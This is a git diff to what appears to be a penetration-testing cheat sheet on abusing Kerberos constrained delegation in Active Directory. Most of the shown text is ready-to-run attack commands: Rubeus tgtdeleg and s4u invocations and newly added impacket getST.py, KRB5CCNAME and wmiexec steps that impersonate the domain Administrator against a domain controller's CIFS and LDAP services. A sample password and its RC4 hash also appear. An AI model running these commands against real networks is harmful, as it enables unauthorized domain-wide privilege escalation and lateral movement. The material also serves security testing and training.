@@ -295,7 +295,13 @@ ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))"
 
 
 ### Delegation form User
-```shell
+
+#### With protocol transition
+![Screenshot_5](https://github.com/user-attachments/assets/8b3283ba-a2a6-4903-bdd5-e2d19f382d02)
+
+
+**Windows**
+```powershell
 # if you are using the Delegation service (in a shell of context of the service) 
 ## request a delegation TGT for the user or computer
 .\Rubeus.exe tgtdeleg
@@ -303,6 +309,7 @@ ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))"
 
 ## Using rubeus, we can now request TGS for administrator@offense.local, who will be allowed to authenticate to CIFS/dc01.offense.local
 Rubeus.exe s4u /ticket:<ticket hash> /impersonateuser:administrator /domain:offense.local /msdsspn:cifs/dc01.offense.local /dc:dc01.offense.local /ptt
+## change target service 
 Rubeus.exe s4u /ticket:<ticket file> /impersonateuser:administrator /domain:offense.local /msdsspn:cifs/dc01.offense.local /altservice:CIFS,HOST,LDAP /dc:dc01.offense.local /ptt
 
 
@@ -310,6 +317,18 @@ Rubeus.exe s4u /ticket:<ticket file> /impersonateuser:administrator /domain:offe
 .\Rubeus.exe hash /password:Slavi123
 .\Rubeus.exe s4u /user:webservice /rc4:FCDC65703DD2B0BD789977F1F3EEAECF /impersonateuser:administrator /domain:offense.local /msdsspn:cifs/dc01.offense.local /altservice:CIFS,HOST,LDAP /dc:dc01.offense.local /ptt
 ```
+
+**Linux**
+```shell
+getST.py -spn 'CIFS/winterfell' -impersonate Administrator -dc-ip '192.168.56.11' 'domain/username:password'
+getST.py -spn 'CIFS/winterfell' -impersonate Administrator -dc-ip '192.168.56.11' 'domain/username:password' -altservice 'ldap/winterfell'
+# then a kerbros ticket will be cached
+export KRB5CCNAME=/path/to/ticket
+
+wmiexec
+
+```
+
 ### Delegation from System/Machine
 ```shell
 # if u are in a shell of context of machine account or in other words you have a SYSTEM level privileges on a machine
